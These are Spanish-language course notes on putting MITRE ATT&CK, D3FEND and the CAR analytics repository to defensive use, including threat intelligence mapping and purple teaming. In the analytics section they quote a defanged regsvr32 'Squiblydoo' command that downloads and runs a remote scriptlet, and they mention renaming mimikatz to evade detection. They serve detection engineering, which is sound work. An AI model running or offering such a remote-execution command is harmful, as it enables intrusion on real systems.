- Creación de objetos de Active Directory
- Eliminación de objetos de Active Directory
- Modificación de objetos de Active Directory

### Comando (DS0017)

La fuente de datos Command se define como "una directiva dada a un programa informático, que actúa como intérprete de algún tipo, para realizar una tarea específica". Actualmente solo hay un componente de datos para el origen de datos de comandos, y es la ejecución de comandos.  

La ejecución de comandos se vincula a técnicas como la manipulación de tokens de acceso (T1134). Para detectar esta actividad en este origen de datos, puede supervisar los comandos de ejecución y los argumentos para la manipulación de tokens. Consulte las fuentes de datos en el sitio web de MITRE ATT&CK para obtener información de detección más detallada.

### Mitigaciones

Las mitigaciones se refieren a las medidas preventivas que puede tomar para evitar que una técnica o subtécnica se ejecute correctamente. Cada una de las tres matrices (Enterprise, Mobile e ICS)  
tiene sus propias mitigaciones enumeradas. Para los fines de este curso, nos centraremos en las mitigaciones que se aplican a la matriz ATT&CK empresarial.

Cada mitigación documentada le proporcionará la siguiente información:
- Una descripción de la mitigación
- Meta detalles sobre la mitigación como ID, Versión, Fecha de Creación y Fecha de Última Modificación.
- Un listado de las técnicas a las que se aplica la mitigación. Cada listado consta de:o la matriz a la que se aplica en la columna Dominio,o el ID de la técnica o subtécnica,o el nombre de la técnica o subtécnica,yo una descripción del uso de la mitigación contra la técnica o subtécnica.

Veamos un ejemplo que nos ayudará a familiarizarnos con la estructura de la mitigación.

### Encriptar información sensible (M1041)

Esta mitigación se utiliza para proteger la información confidencial con un cifrado seguro. Aborda técnicas como Adversario en el medio (T1557), Recopilación automatizada (T1119) y Datos de almacenamiento en la nube (T1530). Entonces, ¿cómo se aplica la mitigación Cifrar información confidencial a estas técnicas? 

En el caso de Adversary-in-the-Middle, el listado nos dice que el uso es para "garantizar que todo el tráfico cableado y/o inalámbrico esté encriptado adecuadamente. Utilice las mejores prácticas para los protocolos de autenticación, como Kerberos, y asegúrese de que el tráfico web que pueda contener credenciales esté protegido por SSL/TLS".  

¿Cómo podría aplicarse esta mitigación también a la recopilación automatizada (T1119)? El uso descrito en su lista dice que "el cifrado y el almacenamiento fuera del sistema de información confidencial pueden ser una forma de mitigar la recopilación de archivos, pero es posible que no impidan que un adversario adquiera la información si una intrusión persiste durante un largo período de tiempo y el adversario puede descubrir y acceder a los datos a través de otros medios. Se deben usar contraseñas seguras en ciertos documentos  
cifrados que las usan para evitar el descifrado fuera de línea a través de técnicas de fuerza bruta".  

La encriptación de información confidencial también es una mitigación para la técnica Data from Cloud Storage (T1530). En este caso, la mitigación sugerida es "Cifrar los datos almacenados en reposo en el almacenamiento en la nube. La mayoría de los proveedores pueden rotar las claves de cifrado administradas. Como mínimo, asegúrese de que un plan de respuesta a incidentes ante una brecha de almacenamiento incluya la rotación de las claves y la prueba del impacto en las aplicaciones cliente".

## Inteligencia de amenazas

Ya se ha hecho referencia a la inteligencia de amenazas varias veces en esta guía. En este capítulo, vamos a analizar la inteligencia de amenazas en relación con el marco ATT&CK.

El marco MITRE ATT&CK proporciona dos elementos clave de la inteligencia de amenazas: cómo operan sus adversarios y las herramientas/software que utilizan para hacerlo. Puede saber cuándo nos estamos refiriendo a una lista de software en ATT&CK porque el ID dado comenzará con una S (en lugar de una T o una TA).  

Del mismo modo, se hace referencia a los grupos con un ID que comienza con una G.

Además, hay campañas, que son una combinación de cómo se comportan sus adversarios y el software que utilizan.

### Grupos de amenazas

[Groups | MITRE ATT&CK®](https://attack.mitre.org/groups/)

El marco ATT&CK ve a los grupos como grupos de actividad, o actividad interrelacionada que utiliza las mismas técnicas o software. El equipo de MITRE ATT&CK utiliza el término "Grupo" para referirse a las diferentes designaciones del clúster de actividad de un adversario. 

![[Pasted image 20240704180347.png]]

Estas designaciones incluyen nombres utilizados en informes públicos  
y se pueden encontrar en "Grupos asociados" en la página de cada grupo. El equipo se esfuerza por rastrear las superposiciones entre estos nombres para aumentar la conciencia de los analistas, pero es importante tener en cuenta que estas asociaciones no son exactas y se recomienda realizar más investigaciones.

Los grupos están vinculados a técnicas que han sido reportadas en fuentes abiertas y se proporcionan las referencias originales. Además, los grupos también están asociados con el software y las campañas notificados.  

### Campañas

[Campaigns | MITRE ATT&CK®](https://attack.mitre.org/campaigns/)

Las campañas son todavía un objeto bastante nuevo dentro del marco de ATT&CK. Se introdujeron en octubre de 2022. De acuerdo con el equipo de MITRE, "A los efectos de la página de Campañas, el equipo de MITRE ATT&CK utiliza el término Campaña para describir cualquier agrupación de actividades de intrusión realizadas durante un período de tiempo específico con metas y objetivos comunes. La actividad de intrusión sin nombre se cita mediante un identificador único de ATT&CK, de lo contrario, el equipo utilizará el nombre de la actividad como se indica en los informes públicos. En el caso de las campañas con nombre, el equipo hace todo lo posible para realizar un seguimiento de los nombres superpuestos, que se designan como  
"Campañas asociadas" en cada página, ya que creemos que estas superposiciones son útiles para los analistas. 

![[Pasted image 20240704180443.png]]

Las inscripciones de la campaña también se atribuirán a las páginas del Grupo ATT&CK y del Software, cuando sea posible, en función de los informes públicos; La actividad no atribuida simplemente hará referencia a "actores de amenazas" en el ejemplo del procedimiento".

Echemos un vistazo a la campaña "Operación Tormenta de Polvo" para comprender mejor qué es una campaña en ATT&CK.

De nuevo, notarás que la mayoría de los objetos en el marco ATT&CK tienen una estructura similar:

- Título
- Descripción
- Meta
- Técnicas/Tácticas/Software/Grupos/Campañas Relacionadas
- Referencias

Podemos obtener una comprensión muy rápida de cómo se ejecuta la campaña leyendo la descripción. En el caso de la Operación Tormenta de Polvo, "la Operación Tormenta de Polvo fue una campaña de espionaje cibernético persistente de larga data que se dirigió a múltiples industrias en Japón, Corea del Sur, Estados Unidos, Europa y varios países del sudeste asiático. En 2015, los actores de amenazas de la Operación Tormenta de Polvo pasaron de ser objetivos de  
inteligencia relacionados con el gobierno y la defensa a empresas japonesas o subdivisiones japonesas de organizaciones extranjeras más grandes que respaldan la infraestructura crítica de Japón, incluida  
la generación de electricidad, el petróleo y el gas natural, las finanzas, el transporte y la construcción.

Los actores de amenazas de la Operación Tormenta de Polvo también comenzaron a usar puertas traseras de Android en sus operaciones en  
2015, y todas las víctimas identificadas en ese momento residían en Japón o Corea del Sur".


## Herramientas para ayudarle a poner en marcha ATT&CK

Ahora que tenemos una mejor idea de cómo las piezas de ATT&CK Framework trabajan juntas para proporcionar inteligencia, debemos discutir las herramientas disponibles para ayudarlo a administrar y trabajar con el marco y poner la inteligencia en uso en su organización.

### Navegador MITRE ATT&CK

El navegador MITRE ATT&CK Navigator está diseñado para proporcionar navegación básica y anotación de la matriz ATT&CK. 

[ATT&CK® Navigator (mitre-attack.github.io)](https://mitre-attack.github.io/attack-navigator/)

La herramienta se utiliza como una forma sencilla de visualizar la matriz ATT&CK y facilitar su uso. Una de las muchas características útiles de ATT&CK Navigator es el uso de los filtros proporcionados para  
resaltar las técnicas utilizadas por un grupo de amenazas en particular. Esto es útil para identificar las técnicas que pueden ser importantes para su organización.  

El navegador MITRE ATT&CK sirve como una herramienta fácil de usar para navegar, anotar y visualizar la matriz ATT&CK. Su objetivo es agilizar el proceso de comprensión y utilización de la matriz para diversos fines de ciberseguridad.  

Características principales del navegador ATT&CK:

- Resaltado de técnicas: El navegador permite a los usuarios aplicar filtros para enfatizar las técnicas empleadas por grupos de amenazas específicos. Esta característica es especialmente útil para las organizaciones que buscan identificar y priorizar las técnicas que suponen un mayor riesgo para su posición de seguridad.
- Personalización: Los usuarios pueden personalizar el navegador de ATT&CK agregando anotaciones o técnicas de codificación por colores en función de su relevancia, prevalencia u otros criterios. Esta funcionalidad ayuda a crear una vista personalizada de la matriz que se alinea con los objetivos específicos de ciberseguridad de la organización.
- Gestión de capas: El navegador de ATT&CK admite la creación, importación y exportación de "capas", que son vistas personalizadas de la matriz. Las capas se pueden compartir entre los miembros del equipo, lo que permite la colaboración y una comprensión coherente del panorama de amenazas.
- Integración: El navegador está diseñado para integrarse con otras herramientas y plataformas, lo que permite compartir y analizar datos sin problemas en varios sistemas de ciberseguridad.

Para obtener más información sobre el navegador ATT&CK, consulte nuestra clase [Aplicación de MITRE ATT&CK Navigator](https://www.academy.attackiq.com/courses/application-of-attck-navigator).

### Calculadora de las mejores técnicas de ATT&CK

MITRE ATT&CK puede ser un poco desalentador y difícil de implementar en el programa de seguridad de su organización al principio. El problema de defenderse contra todas las técnicas de ATT&CK de MITRE puede ser difícil y costoso, y los defensores a menudo tienen recursos limitados para discernir qué técnicas  
de ATT&CK deben tener prioridad. 

Con la herramienta Top ATT&CK Techniques, podemos dar a los defensores un punto de partida sobre dónde deben enfocar sus defensas en función de los factores que son importantes para ellos. 
Para acceder a esta herramienta, visite el [repositorio de GitHub del proyecto.](https://github.com/center-for-threat-informed-defense/top-attack-techniques) 

Para obtener más información sobre la Calculadora de las Mejores Técnicas de ATT&CK, consulte nuestra clase [Las mejores técnicas de ATT&CK.](https://www.academy.attackiq.com/courses/top-attck-techniques)

![[Pasted image 20240705175017.png]]

### Workbench

Para entender el proyecto ATT&CK Workbench, primero revisemos la situación actual. Muchos profesionales de la seguridad estarían de acuerdo en que no hay escasez de informes de inteligencia, herramientas de seguridad, análisis de detección y técnicas de emulación de amenazas. 

Difícilmente parece haber un día que pase por alto en el que veamos casi cero noticias de seguridad de alguna forma. Si bien los proveedores de seguridad han hecho un gran trabajo al incluir mapeos y etiquetas MITRE ATT&CK en sus herramientas, uno de los mayores problemas de la ciberseguridad es esta sobrecarga de información y no saber qué hacer con la información constante que aparece a diario. 

Más específicamente, la puesta en marcha del marco MITRE ATT&CK puede parecer desalentadora al principio debido a lo extenso que se ha vuelto el marco, particularmente en los últimos años.  

Supongamos que trabajas en un equipo azul. Es posible que esté iniciando sesión en su SIEM o en una consola de seguridad, investigando alertas y eventos, tratando de confirmar falsos negativos de falsos positivos o tratando de asegurarse de que tiene reglas y análisis de detección ajustados y que funcionan como se desea. ¿Qué pasa si encuentras una nueva técnica observada en tu entorno? ¿Cómo se hace un seguimiento de eso y cómo se puede utilizar el marco de ATT&CK para comprobar las brechas y la cobertura?

O puede estar trabajando en un equipo rojo, ejecutando emulaciones de amenazas a partir de comportamientos conocidos o de TTP suministrados por su equipo de CTI o desde el marco ATT&CK. A medida que realiza sus operaciones de equipo rojo, ¿cómo puede mostrar valor en términos de cobertura en comparación con el marco MITRE ATT&CK?  

Ejecutar una operación de equipo rojo una o dos veces al año puede ser valioso, pero para las organizaciones que desean realizar pruebas continuas, demostrar la cobertura en términos de técnicas no solo  
emuladas sino también detectadas es muy valioso.

Y luego está la inteligencia de amenazas. Tal vez su equipo de CTI recopile y raspe su propia información internamente o a través de otros canales, o tal vez utilice una combinación de fuentes e informes de inteligencia pública y comercial. Agregar nuevas técnicas y referencias le permite a usted y a su equipo asignarlas al grupo o campaña para un seguimiento continuo, así como pruebas continuas  
con sus controles de seguridad. 

Independientemente del área en la que trabaje, sus equipos de seguridad pueden beneficiarse de poder rastrear, editar y agregar notas en su instancia local de ATT&CK, lo que les permite trabajar de manera más colaborativa hacia un enfoque de defensa informado sobre amenazas.


## D3FEND

[D3FEND Matrix | MITRE D3FEND™](https://d3fend.mitre.org/)

![[Pasted image 20240706162115.png]]
Según el sitio web de MITRE D3FEND, "D3FEND es una base de conocimiento, pero más específicamente un gráfico de conocimiento, de técnicas de contramedidas de ciberseguridad. En el sentido más simple, es un catálogo de técnicas de ciberseguridad defensiva y sus relaciones con las técnicas ofensivas/adversarias". 

Este grafo de conocimiento vincula el modelo ofensivo (ATT&CK) con el modelo defensivo (D3FEND).  

El acrónimo D3FEND significa Detection, Denial, and Disruption Framework Empowering Network Defense (Marco de detección, denegación e interrupción que potencia la defensa de la red).  

D3FEND es una matriz que nos permite correlacionar el marco ATT&CK con un vocabulario común para describir las acciones defensivas que se pueden tomar para detectar o interrumpir las técnicas de los atacantes.


![[Pasted image 20240706162516.png]]
Las tácticas (enumeradas en el eje vertical superior de la matriz) incluyen:

- Modelo: se utiliza para aplicar análisis de ingeniería de seguridad, vulnerabilidades, amenazas y riesgos a los sistemas digitales.
- Harden: se utiliza para aumentar el costo de oportunidad de la explotación de redes informáticas. El endurecimiento difiere de la detección en que generalmente se lleva a cabo antes de que un sistema esté en línea y operativo.
- Detectar: se utiliza para identificar el acceso del adversario a actividades no autorizadas en redes informáticas.
- Aislar: crea barreras lógicas o físicas en un sistema que reduce las oportunidades para que los adversarios creen un mayor acceso.
- Engañar: se utiliza para anunciar, atraer y permitir que los atacantes potenciales accedan a un entorno observado o controlado.
- Desalojar: se utiliza para eliminar a un adversario de una red informática.

Las tácticas se dividen a su vez en técnicas y subtécnicas para gráficos de conocimiento más específicos.  

La matriz se puede buscar por ID de técnica ATT&CK, ID de técnica D3FEND o Artefacto.

### Artefactos

[Digital Artifact Ontology | MITRE D3FEND™](https://d3fend.mitre.org/dao/)

![[Pasted image 20240706163510.png]]
Los artefactos D3FEND son entradas específicas dentro de la base de conocimientos que describen una técnica o táctica defensiva en detalle. 

Cada artefacto D3FEND proporciona una descripción general completa de la técnica defensiva, incluida información sobre cómo funciona, cuándo es efectiva y cómo se puede usar para defenderse contra tipos específicos de amenazas cibernéticas.  

Los artefactos D3FEND se clasifican en varios grupos según el tipo de técnica defensiva que describen. Por ejemplo, algunos artefactos describen técnicas para la defensa de la red, mientras que otros describen técnicas para la defensa de puntos de conexión o la protección de datos. Cada artefacto incluye una descripción detallada  
de la técnica, junto con ejemplos de cómo se puede usar en diferentes escenarios.

### Gráfico de conocimiento/Gráfico de relaciones inferidas

Para los propósitos de este curso, utilizaremos la función de búsqueda ATT&CK para explorar el gráfico de conocimiento de D3FEND relacionado con esa técnica. 

Usar la función de búsqueda de ATT&CK es tan fácil como escribir el ID de la técnica de ATT&CK que está tratando de investigar.  

El gráfico Relaciones inferidas que da como resultado el identificador de técnica mostrará los controles de la izquierda, el impacto que tienen esos controles en los artefactos digitales y las técnicas que pueden ser interrumpidas o  detectadas por esos controles, y el impacto que tiene en los artefactos.

Explicar esta relación es mejor hacerlo con un ejemplo. Tomemos uno de antes: Cuentas válidas (T1078).  

Comenzaremos buscando T1078 en la matriz D3FEND y seleccionando el T1078 sugerido automáticamente - Cuentas válidas.  

Esto dará como resultado una página para la técnica. Si se desplaza hacia abajo en esa página, verá un gráfico titulado "Relaciones inferidas de D3FEND". El gráfico es bastante largo, por lo que no se incluye en su totalidad en esta guía.  

Si no estaba familiarizado con el control enumerado, puedo hacer clic en él para obtener más información. En este caso, estoy interesado en el umbral de eventos de autenticación, así que voy a hacer clic en este control para obtener más información.  

Sin embargo, antes de hacer clic en él, exploremos la relación entre el umbral de eventos de autenticación, sus artefactos digitales y la técnica T1078 - Cuentas válidas.  

Solo a partir de la visualización, podemos ver que:

- El umbral de eventos de autenticación puede detectar cuentas válidas (T1078)
- Umbral de eventos de autenticación analiza Authentication.
- Cuentas válidas (T1078) utiliza Cuenta de usuario.
- Cuentas válidas (T1078) produce Authentication.
- Cuentas válidas (T1078) produce Authorization.

Una vez aclarada esa descripción general, hagamos clic en Umbral de eventos de autenticación. Los datos clave que se enumeran en esta página son:

- Definición: descripción del control de seguridad.
- Cómo funciona: una explicación más detallada de cómo funciona el control de seguridad.
- Acciones: acciones que se pueden realizar después del análisis 
-  Ejemplos de fuentes de datos: una lista de posibles puntos de recopilación de datos que serían útiles para el control de seguridad.
- Consideraciones - Aspectos a tener en cuenta al implementar el control de seguridad.
- Relaciones de artefactos digitales: una lista trazada del control de seguridad y el impacto que tiene en los artefactos digitales.
- Técnicas ATT&CK relacionadas: una pantalla de matriz ATT&CK que muestra otras técnicas ATT&CK que están relacionadas en función del control de seguridad utilizado.
- Referencias: una lista de las fuentes utilizadas para crear la información en la página e información adicional sobre el control de seguridad.

Desde la página Umbral de eventos de autenticación, el umbral de eventos de autenticación es "recopilar eventos de autenticación, crear un perfil de usuario de línea base y determinar si los eventos de autenticación son coherentes con el perfil de línea base".  

![[Pasted image 20240706173616.png]]


Se describe que funciona de esta manera:  

"Los datos del evento de autenticación se recopilan (información de inicio de sesión, como el ID del dispositivo, la hora del día, el día de la semana, la ubicación geográfica, etc.) para crear una línea base de actividad. 

A continuación, se determina un umbral a través de una configuración especificada manualmente o de un análisis estadístico de las desviaciones en los datos históricos.  

![[Pasted image 20240706173717.png]]

Los nuevos eventos de autenticación se evalúan para determinar si se supera un umbral. Los umbrales pueden ser estáticos o dinámicos".  

Se enumeran dos opciones para las acciones que se pueden realizar después de que se haya realizado el análisis y se haya determinado que se ha producido un evento de seguridad:

- Bloqueo de cuenta (desalojo)
- Generar una alerta

### Asignación de inteligencia organizativa a ATT&CK

Si tiene una organización más madura, es posible que haya analistas de amenazas que revisen regularmente la información sobre sus adversarios. 

Si tiene acceso a informes de incidentes anteriores, comience a asignar las tácticas identificadas en el informe a la matriz MITRE ATT&CK. Los bloques de párrafo pueden parecer imposibles de volver a asignar a ATT&CK, por lo que MITRE ha ofrecido algunas sugerencias para hacerlo.

Comprenda ATT&CK: familiarícese con la estructura general de ATT&CK:

- a. Tácticas: los objetivos técnicos del adversario
- b. Técnicas: cómo se logran esos objetivos
- c. Procedimientos - Implementaciones específicas de técnicas
- Encuentre el comportamiento: piense en la acción del adversario de una manera más amplia que solo el indicador atómico (como una dirección IP) utilizado. Por ejemplo, puede notar que el malware del adversario establece una conexión SOCKS5. El acto de establecer una conexión es un comportamiento que muestra el adversario.
- Investigue el comportamiento: si no está familiarizado con el comportamiento, es posible que deba investigar más. En nuestro ejemplo, un poco de investigación mostraría que SOCKS5 es un protocolo de capa 5 (capa de sesión).
- Traduzca el comportamiento en una táctica: considere el objetivo técnico del adversario para ese comportamiento y elija una táctica que se ajuste. Para el ejemplo de conexión SOCKS5, el establecimiento de una conexión para comunicarse posteriormente caería dentro de la táctica de comando y control.
- Averigüe qué técnica se aplica al comportamiento: esto puede ser un poco complicado, pero con sus habilidades de análisis y los ejemplos del sitio web de ATT&CK, es factible. Si busca ATT&CK para SOCKS, aparece la técnica Standard Non-Application Layer Protocol (T1095). Al observar la descripción de la técnica, encontrará que aquí podría ser donde encaja nuestro comportamiento.
- Compara tus resultados con los de otros analistas: por supuesto, es posible que tengas una interpretación diferente de un comportamiento que la de otro analista. Esto es normal y se espera que suceda. Se recomienda comparar su mapeo de información de ATT&CK con el de otro analista y discutir cualquier diferencia.

### Amplíe los datos de inteligencia

Los equipos que están más avanzados y tienen los recursos pueden asignar información externa adicional a ATT&CK. Expandir los datos de esta manera permite que su inteligencia de amenazas expansiva fluya  
a través de sus equipos de seguridad para que puedan enfrentarse a la amenaza de manera defensiva, lo que permite una defensa más informada sobre las amenazas.


## Detección y análisis

![[Pasted image 20240706205129.png]]


![[Pasted image 20240706204202.png]]

![[Pasted image 20240707130918.png]]

Vamos a ampliar nuestro conocimiento de la inteligencia de amenazas a medida que hablemos de detección y análisis. Aquí es donde podemos empezar a tomar más medidas para construir una defensa informada sobre amenazas.  

Analicemos los pasos que podemos dar para poner esto en práctica.

### Recopilar los datos

Antes de comenzar a recopilar datos, es útil comprender las fuentes de las que debe recopilar. MITRE también tiene algunas recomendaciones aquí.

- El proceso y la supervisión de la línea de comandos del proceso se pueden recopilar a través de Sysmon, registros de eventos de Windows y muchas plataformas EDR.
- La supervisión de archivos y registros también suele ser recopilada por Sysmon, los registros de eventos de Windows y muchas plataformas EDR.
- Registros de autenticación recopilados del controlador de dominio.
- Captura de paquetes, especialmente la captura este/oeste, como las recopiladas entre hosts y enclaves de la red.

MITRE ha creado algunos scripts para ayudar a descubrir estos datos. Los han [puesto a disposición del público en Github.](https://github.com/mitre-attack/attack-scripts/tree/master/scripts)

### Analizar los datos

Una vez que hayas identificado los datos que necesitas, recógelos en algún tipo de plataforma de búsqueda para que puedan ser analizados. Para la mayoría de ustedes, esta plataforma será un SIEM. MITRE también ha proporcionado orientación adicional sobre qué buscar en este análisis.

### Repositorio de análisis cibernético (CAR) de MITRE

[CAR](https://car.mitre.org/) es una base de conocimientos de análisis desarrollada por MITRE y se basa en el modelo de adversarios MITRE ATT&CK. Los análisis almacenados en CAR contienen la siguiente información para cada análisis:

- Una hipótesis que explica la idea detrás de una analítica
- La información o el dominio principal en el que está diseñado el análisis para operar (puede ser host, red, proceso, externo, etc.)
- Referencias a las Técnicas y Tácticas ATT&CK que detecta el analítico
- El Glosario
- Una descripción de pseudocódigo de cómo se puede implementar el estudio analítico
- Una prueba unitaria que se puede ejecutar para desencadenar el análisis
![[Pasted image 20240707160419.png]]

Al revisar los datos presentados en MITRE CAR, puede comenzar no solo a analizar los comportamientos que ocurren en su empresa, sino también comenzar a expandir sus datos de inteligencia de amenazas mediante la asignación de estos comportamientos a MITRE ATT&CK. 

En nuestro curso [Fundamentos de la simulación de brechas y ataques](https://www.academy.attackiq.com/courses/foundations-of-breach-attack-simulation), analizamos la creación de planes de prueba basados en sus defensas. 

CAR puede ayudar a crear planes de prueba proporcionando pruebas unitarias que activan alertas o análisis.  

A partir de la versión 13 de ATT&CK CAR, se ha agregado el pseudocódigo a muchos componentes de datos de ATT&CK.  

Por ejemplo, en la detección de la subtécnica T1053.005, puede ver que se ha presentado pseudocódigo para su detección a través del componente de datos de ejecución de comandos (DS0017).

### Amplíe y personalice su análisis

Si su organización ya ha dado los primeros pasos en la recopilación de datos y el uso de los análisis existentes, ahora es un buen momento para ampliar la cobertura creando los suyos propios.

![[Pasted image 20240707160846.png]]
Completar este ejercicio para su empresa también tiene la ventaja añadida de familiarizarle con el proceso de pensamiento que hay detrás de la creación de detecciones y análisis.

- Comience por mirar la descripción de la técnica de ATT&CK y los informes de inteligencia de amenazas vinculados a la técnica Aquí hay un ejemplo proporcionado por MITRE en su documento Introducción a ATT&CK: Supongamos que no hubo buenas detecciones para Regsvr32. La página de ATT&CK enumera varias variantes diferentes de cómo se usa Regsvr32. En lugar de escribir un análisis para cubrirlos todos, concéntrese en un solo aspecto para evitar que le den vueltas. Por ejemplo, es posible que desee detectar la variante "Squiblydoo" que fue descubierta por Casey Smith en Red Canary. Los informes vinculados a partir de los ejemplos muestran varias instancias de líneas de comandos en las que se utilizó Regsvr32, como este ejemplo del análisis Cybereason de Cobalt Kitty: Los atacantes descargaron scriptlets COM usando regsvr32.exe: regsvr32 /s/n/u/i:hxxp://support.chatconnecting(.) com:80/pic.png scrobj.dll EVIDENCIA DE SQUIBLYDOO UTILIZADO POR COBALT KITTY
- Diseñe una prueba para sus análisis utilizando las técnicas que ha descubierto. Las pruebas se pueden realizar con una solución BAS comercial o de código abierto. Continuando con el ejemplo anterior, miraría las pruebas disponibles para Regsvr32, incluido Squiblydoo.
- Después de ejecutar la prueba, revise los datos de registro generados durante el ataque. Busque cosas que hagan que el evento malicioso parezca distintivo.

Se eligió Squiblydoo como ejemplo porque es un poco más fácil de encontrar en los datos de registro. No hay  
una razón legítima para que regsvr32.exe llame a Internet. En este caso, el análisis que se debe buscar serían las horas en las que se crea el proceso regsvr32.exe y la línea de comandos incluye "/i:http".


## Emulación de adversarios y Red Teaming

MITRE define la emulación de adversarios como "un tipo de compromiso del equipo rojo que imita una amenaza conocida  
para una organización mediante la combinación de inteligencia de amenazas para definir qué acciones y comportamientos utiliza el equipo rojo". En otras palabras, el equipo rojo adopta un enfoque estructurado mediante el uso de inteligencia de amenazas para planificar un ataque que es similar al comportamiento de los actores de amenazas conocidos.

### ¿Qué pasa si no tienes un equipo rojo?

![[Pasted image 20240707163743.png]]
Los equipos que no tienen un equipo rojo pueden automatizar y diseñar este proceso un poco más fácilmente utilizando una herramienta BAS. También hay otras opciones de código abierto, como Atomic Red Team, que pueden proporcionar a un equipo que carece de la experiencia del equipo rojo, la capacidad de realizar la emulación del adversario red teaming. 

MITRE es compatible con el proyecto CALDERA, una solución BAS de código abierto. 

También hay herramientas BAS comerciales, como AttackIQ, que están disponibles. Profundizamos en lo que son estas herramientas y lo que pueden hacer por ti en nuestro curso Fundamentos de la simulación de brechas y ataques.

### Equipo púrpura

El Purple Teaming es un concepto organizacional por el cual las funciones rojas y azules ocurren simultáneamente, continuamente, estrechamente acopladas y con pleno conocimiento de las capacidades, limitaciones e intenciones de cada uno en un momento dado. 

Una de las mejores maneras de probar y desarrollar realmente una defensa informada sobre amenazas es permitir la colaboración entre los equipos rojo y azul a través de un equipo morado. 

Con un acceso fiable a las capacidades rojas, esta metodología permite a los equipos de seguridad aumentar de forma iterativa la madurez del programa como producto de la eliminación continua de los ataques de bajo esfuerzo de la placa.  

Echemos un vistazo al flujo de trabajo de un equipo morado.

- Red Team ejecuta ataques iterativos contra el ciberespacio amigo, ajustados para replicar las capacidades del adversario y evitar interrupciones irrecuperables
- Los ataques detenidos generan informes de los detalles de detección y mitigación que se envían al equipo rojo
- Los ataques exitosos generan informes del método de ataque y los detalles de exposición al equipo azul.
- Los equipos rojo y azul informan conjuntamente de todas las acciones en coordinación con las operaciones de TI; Mitigaciones, técnicas de ataque refinadas, superficie de ataque reducida
- Las pruebas y mejoras continuas refinan las capacidades de detección y permiten una ejecución de escenarios cada vez más difícil, lo que refina las capacidades de detección

Continuemos con nuestro ejemplo de la conferencia para ilustrar cómo el concepto de Equipo Púrpura encaja bien con un equipo que pone en funcionamiento MITRE ATT&CK. Hasta ahora, ha realizado la investigación y ha creado varios análisis para ayudar a aumentar la capacidad de detección en torno al volcado de credenciales. Ahora queremos hacer de este un ejercicio que mejore no solo los análisis, sino también las habilidades de todos los involucrados.

- En primer lugar, el equipo azul produce un análisis para detectar el volcado de credenciales. Supongamos que se creó en función de un análisis para detectar mimikatz.exe en la línea de comandos o Invoke Mimikatz a través de Powershell.
- Este análisis se entrega al equipo rojo.
- El equipo rojo utiliza el análisis producido por el equipo azul para encontrar y ejecutar un ataque que evade la detección de ese análisis. En nuestro ejemplo, diremos que el equipo rojo cambia el nombre del ejecutable a mimidogz.exe.
- Esta táctica creada por el equipo rojo se entrega al equipo azul.
- El equipo azul actualiza su analítica para buscar diferentes artefactos y comportamientos que dependan de la nomenclatura exacta.
- Este análisis se devuelve al equipo rojo y el ciclo continúa.

Para realizar un seguimiento de la cobertura, ambos equipos deben trabajar para utilizar el marco común de ATT&CK en la documentación.  

Para profundizar en el modelo de Purple Teaming, te recomendamos que realizar el Curso de Fundamentos de Purple Teaming de academy.attackiq.com.